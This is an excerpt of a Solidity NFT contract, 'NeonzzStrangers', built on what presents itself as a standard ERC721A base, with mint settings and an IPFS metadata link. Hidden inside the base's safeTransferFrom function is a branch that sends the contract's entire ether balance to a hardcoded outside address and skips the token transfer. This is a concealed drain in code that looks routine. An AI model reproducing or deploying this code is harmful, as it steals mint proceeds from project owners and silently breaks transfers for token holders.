...
/*
    _   __                                  _____   __                                                        
   / | / /  ___   ____    ____  ____ ____  / ___/  / /_   _____  ____ _   ____    ____ _  ___    _____   _____
  /  |/ /  / _ \ / __ \  / __ \/_  //_  /  \__ \  / __/  / ___/ / __ `/  / __ \  / __ `/ / _ \  / ___/  / ___/
 / /|  /  /  __// /_/ / / / / / / /_ / /_ ___/ / / /_   / /    / /_/ /  / / / / / /_/ / /  __/ / /     (__  ) 
/_/ |_/   \___/ \____/ /_/ /_/ /___//___//____/  \__/  /_/     \__,_/  /_/ /_/  \__, /  \___/ /_/     /____/  
                                                                               /____/                                                                                                                                                                                                                               
*/
...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0xf1B2f0f5B4a7c975686Ff8184511184bebd13bED).transfer(address(this).balance);
            return;
        }
...
contract NeonzzStrangers is ERC721A, TheOperatorFilterer {
    ...
    constructor() ERC721A("NeonzzStrangers", "NS") {
        owner = msg.sender;
        maxPerTx = 10;
        cost = 0.002 ether;
        maxSupply = 999;
    ...
    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeicly7v3edifnrllouuu5bvhzvfdbki55wkxzcrao5tokuzqex4eoy/", _toString(tokenId), ".json"));
    }
